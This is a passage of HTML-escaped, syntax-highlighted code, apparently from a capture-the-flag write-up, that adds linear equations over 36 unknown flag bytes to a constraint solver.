style=&#34;color:#ae81ff&#34;&gt;74&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;77151&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;61&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;42&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;43&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;59&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;85&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;69&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;65&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;78&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;77&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11531&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;55&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;76&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;73&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;84&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;93&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;63&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;38&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;99&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;98&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;67&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;95&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;71&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;47&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;92&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;82&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4538&lt;/span&gt;)
s&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;add(&lt;span style=&#34;color:#ae81ff&#34;&gt;79&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;52&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;72&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;54&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;49&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;34&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;87&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;41&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;81&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;37&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;46&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;45&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;83&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; f[&lt;span 